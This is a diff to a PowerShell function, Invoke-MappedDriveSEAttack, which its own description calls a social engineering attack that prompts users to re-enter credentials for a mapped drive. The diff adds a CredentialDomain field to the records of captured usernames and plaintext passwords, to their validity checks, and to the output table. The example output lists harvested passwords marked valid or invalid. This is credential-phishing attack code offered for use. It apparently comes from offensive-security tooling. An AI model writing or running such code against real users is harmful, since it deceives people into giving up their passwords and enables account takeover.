@@ -34,10 +34,10 @@ Function Invoke-MappedDriveSEAttack
 
             Example Output:
 
-            Domain    Username        Password  Valid
-            ------    --------        --------  -----
-            MyDomain  MyDomain\user   P@ssword  False
-            MyDomain  MyDomain\admin  P@ssword  True
+            Domain    CredentialDomain   Username   Password  Valid
+            ------    ----------------   --------   --------  -----
+            MyDomain  MyDomain           user       P@ssword  False
+            MyDomain  DifferentDomain    admin      P@ssword  True
 
             .Description Social engineering attack prompting users re-enter credentials for a mapped drive on their computer.
 
@@ -114,6 +114,7 @@ Function Invoke-MappedDriveSEAttack
         {
             $credentialsTemp = New-Object -TypeName psobject -Property @{
                 Domain   = $CurrentDomain
+                CredentialDomain = $UserDefDomain
                 Username = $username
                 Password = $password
                 Valid    = $false
@@ -130,6 +131,7 @@ Function Invoke-MappedDriveSEAttack
         {
             $credentialsTemp = New-Object -TypeName psobject -Property @{
                 Domain   = $CurrentDomain
+                CredentialDomain = $UserDefDomain
                 Username = $username
                 Password = $password
                 Valid    = $true
@@ -141,6 +143,6 @@ Function Invoke-MappedDriveSEAttack
     While($ValidCreds -eq $false)
     '##Credentials##'
     $credentials |
-    Select-Object -Property Domain, Username, Password, Valid |
+    Select-Object -Property Domain, CredentialDomain, Username, Password, Valid |
     Format-Table -AutoSize
 }
